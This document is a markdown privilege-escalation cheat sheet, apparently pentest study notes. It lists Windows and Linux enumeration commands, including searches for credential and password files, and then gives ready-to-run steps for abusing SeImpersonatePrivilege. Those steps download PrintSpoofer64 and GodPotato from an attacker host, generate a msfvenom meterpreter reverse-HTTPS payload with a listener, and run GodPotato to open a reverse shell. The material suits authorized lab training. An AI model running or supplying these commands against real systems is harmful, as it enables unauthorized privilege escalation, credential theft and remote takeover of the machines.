# 04 - Privilege Escalation

Index
- [System Enumeration](#System-Enumeration)
    - [Windows](#Windows)
    - [Linux](#Linux)
- [SeImpersonatePrivilege](#SeImpersonatePrivilege)
    - [Exploit by PrintSpoofer64](#Exploit-by-PrintSpoofer64)
    - [Exploit by GodPotato](#Exploit-by-GodPotato)

## System Enumeration
### General Info
- Search for:
    - user privileges and system configuration
    - git repository and logs
    - archive file like ZIP, BAK, KDBX (and crack it!)
    - web configuration file (CMS config, DB connection file)
    - enumeration tool output

### Windows
Base commands for Windows:
``` powershell
whoami                                  ## domain\username
whoami /groups                          ## my groups
whoami /priv                            ## user's local privileges
Get-LocalUser                           ## local users list
Get-LocalGroup                          ## local groups list
Get-LocalGroupMember $GROUP_NAME        ## members list
net user $USERNAME                      ## user information
net user /domain                        ## domain user list

systeminfo                              ## OS version, domain config, ...
ipconfig /all                           ## network configuration
route print                             ## local routing table
netstat -nao                            ## acctive connections and listening ports
Get-ChildItem Env:                      ## environment vars -- tips: informations hidden
Get-Process                             ## process list

Get-History                             ## history
(Get-PSReadlineOption).HistorySavePath  ## read the content to access the history
```
Search information in file:
``` powershell
Get-ChildItem -Path c:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
Get-ChildItem -Path c:\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue                             ## search for interesting file
Get-ChildItem -Path c:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue                            ## search for interesting file
Get-ChildItem -Path c:\ -Include *.git -File -Recurse -ErrorAction SilentlyContinue 
Get-ChildItem -Path c:\ -Include credential* -File -Recurse -ErrorAction SilentlyContinue                       ## search for interesting file
Get-ChildItem -Path c:\ -Include password* -File -Recurse -ErrorAction SilentlyContinue                         ## search for interesting file

Get-ChildItem -Path c:\ -Include *.git* -File -Recurse -ErrorAction SilentlyContinue                            ## search for git repo
git log                                                                                                         ## check information in log
git view $LOGID                                                                                                 ## check commit log content
```

Other for Windows:
``` powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname ## installed software
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname             ## installed software
```

Tools for Windows:
 - winPEAS.exe
 - Seatbelt.exe

### Linux
Base commands for Linux:
``` bash
id
env
history
cat /etc/passwd                             ## user list
ls -la /home                                ## home
ps ax                                       ## process list
uname -na                                   ## os version
ss -anp                                     ## connections
cat /etc/crontab                            ## main crontab
ls -la /etc/cron*                           ## crontab script
ls -la /etc/sudo*
cat /etc/fstab
find / -writable -type d 2>/dev/null        ## writable dir
find / -perm -u=s -type f 2>/dev/null

find ./ -type f -name "*.txt" 2>/dev/null   ## file by extension
find ./ -type f -name "*.tar" 2>/dev/null   ## file by extension
find ./ -type f -name "*.bak" 2>/dev/null   ## file by extension
find ./ -type f -name "*.zip" 2>/dev/null   ## file by extension
find ./ -type f -name "*.gz" 2>/dev/null    ## file by extension

lsmod
/sbin/modinfo $driver_name
dpkg -l
```

Tools for Linux:
 - unix-privesc-check
 - linpeas

## SeImpersonatePrivilege
### Requirements
- Need access to the target system.
- Verify user's privileges:
``` powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled     ## possibly vulnerable
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Exploit by PrintSpoofer64
PrintSpoofer64.exe can exploit the local system and elevate the privileges.
``` powershell
iwr http://192.168.1.1:8888/PrintSpoofer64.exe -outfile PrintSpoofer64.exe      ## download on target system
.\PrintSpoofer64.exe -i -c powershell.exe                                       ## exploit
```

### Exploit by GodPotato
GodPotato.exe can exploit the local system and run command with elevate privilege. Useful link: https://jlajara.gitlab.io/Potatoes_Windows_Privesc.

Generate a payload and a listester:
``` bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$KALI LPORT=443 -f exe -o payload.exe   ## generate payload
msfconsole                                                                                      ## open msfconsole
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https                 ## set payload
msf6 exploit(multi/handler) > set LHOST $KALI
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

Exploit the system:
``` powershell
iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
./GodPotato.exe -cmd "powershell /c ./payload.exe"                                              ## exploit: open a reverse shell
```
